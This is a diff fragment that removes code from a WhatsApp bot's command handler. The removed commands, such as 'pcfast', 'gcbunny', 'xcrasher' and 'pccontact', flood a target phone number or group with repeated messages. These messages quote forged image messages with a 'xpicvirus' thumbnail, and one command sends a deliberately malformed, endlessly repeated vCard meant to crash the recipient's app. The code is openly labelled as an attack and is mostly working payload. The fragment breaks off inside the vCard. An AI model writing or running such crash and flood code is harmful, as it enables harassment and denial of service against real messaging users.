-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcmassxeon})
-            await sleep(30000)
-            reply(mess.success)
-            break
-                    case 'gcfast':               
-            	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (!m.isGroup) return m.reply(mess.group)
-             gcinfinitexeon = { 
-                    key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, 
-                        ...({ remoteJid: "" }) 
-                    }, 
-                    message: { 
-                        "imageMessage": { 
-                            "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-                            "jpegThumbnail": xpicvirus
-                        } 
-                    } 
-                }
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:gcinfinitexeon})
-            break
-case 'pcfast':               
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxxxx`)
-             pcinfinitexeon = { 
-                    key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, 
-                        ...({ remoteJid: "" }) 
-                    }, 
-                    message: { 
-                        "imageMessage": { 
-                            "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-                            "jpegThumbnail": xpicvirus
-                        } 
-                    } 
-                }
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcinfinitexeon})
-            reply(mess.success)
-            break
-                   case 'pcgcfast':               
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (!m.isGroup) return m.reply(mess.group)
-if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxxxxxx`)
-             pcgcinfinitexeon = { 
-                    key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, 
-                        ...({ remoteJid: "" }) 
-                    }, 
-                    message: { 
-                        "imageMessage": { 
-                            "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-                            "jpegThumbnail": xpicvirus
-                        } 
-                    } 
-                }
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pcgcinfinitexeon})
-            break
-case 'gcbunny': {            
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (!m.isGroup) return m.reply(mess.group)
-             bunnygcxez = `
-///....▓▓▓▓
-///..▓▓......▓
-///..▓▓......▓▓..................▓▓▓▓
-///..▓▓......▓▓..............▓▓......▓▓▓▓
-///..▓▓....▓▓..............▓......▓▓......▓▓
-///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
-///......▓▓....▓........▓....▓▓..........▓▓....▓
-///........▓▓..▓▓....▓▓..▓▓................▓▓
-///........▓▓......▓▓....▓▓
-///.......▓......................▓
-///.....▓.........................▓
-///....▓......^..........^......▓
-///....▓...........❤...........▓
-///....▓..........................▓
-///.....▓..........ٮ..........▓
-///.........▓▓..........▓▓
-`
-             bunnygcxeon13 = { 
-                    key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, 
-                        ...({ remoteJid: "" }) 
-                    }, 
-                    message: { 
-                        "imageMessage": { 
-                            "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-                            "jpegThumbnail": xpicvirus
-                        } 
-                    } 
-                }
-            await QueenNilu.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
-            await QueenNilu.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
-            await QueenNilu.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
-            await QueenNilu.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
-            await QueenNilu.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
-            }
-            break
-          case 'pcbunny': { 
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbunny 91xxxxxxxxxx`)
-             rabbitxeon = `
-///....▓▓▓▓
-///..▓▓......▓
-///..▓▓......▓▓..................▓▓▓▓
-///..▓▓......▓▓..............▓▓......▓▓▓▓
-///..▓▓....▓▓..............▓......▓▓......▓▓
-///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
-///......▓▓....▓........▓....▓▓..........▓▓....▓
-///........▓▓..▓▓....▓▓..▓▓................▓▓
-///........▓▓......▓▓....▓▓
-///.......▓......................▓
-///.....▓.........................▓
-///....▓......^..........^......▓
-///....▓...........❤...........▓
-///....▓..........................▓
-///.....▓..........ٮ..........▓
-///.........▓▓..........▓▓
-`
-             rabbitbugxeon = { 
-                    key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, 
-                        ...({ remoteJid: "" }) 
-                    }, 
-                    message: { 
-                        "imageMessage": { 
-                            "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-                            "jpegThumbnail": xpicvirus
-                        } 
-                    } 
-                }
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
-            await sleep(30000)
-            }
-            break 
-                      case 'pcgcbunny': {            
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (!m.isGroup) return m.reply(mess.group)
-if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxxx`)
-             bunnypcgcx = `
-///....▓▓▓▓
-///..▓▓......▓
-///..▓▓......▓▓..................▓▓▓▓
-///..▓▓......▓▓..............▓▓......▓▓▓▓
-///..▓▓....▓▓..............▓......▓▓......▓▓
-///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
-///......▓▓....▓........▓....▓▓..........▓▓....▓
-///........▓▓..▓▓....▓▓..▓▓................▓▓
-///........▓▓......▓▓....▓▓
-///.......▓......................▓
-///.....▓.........................▓
-///....▓......^..........^......▓
-///....▓...........❤...........▓
-///....▓..........................▓
-///.....▓..........ٮ..........▓
-///.........▓▓..........▓▓
-`
-
-             xeonpcgcbunny = { 
-                    key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, 
-                        ...({ remoteJid: "" }) 
-                    }, 
-                    message: { 
-                        "imageMessage": { 
-                            "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-                            "jpegThumbnail": xpicvirus
-                        } 
-                    } 
-                }
-            await QueenNilu.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
-            await sleep(30000)
-            }
-            break
- case 'xcrasher':{
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-kwkwkx = '``🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot``',
-QueenNilu.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Janiya☣️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
-}
-}
-break
-case 'pccontact': {
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Janiya☣️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 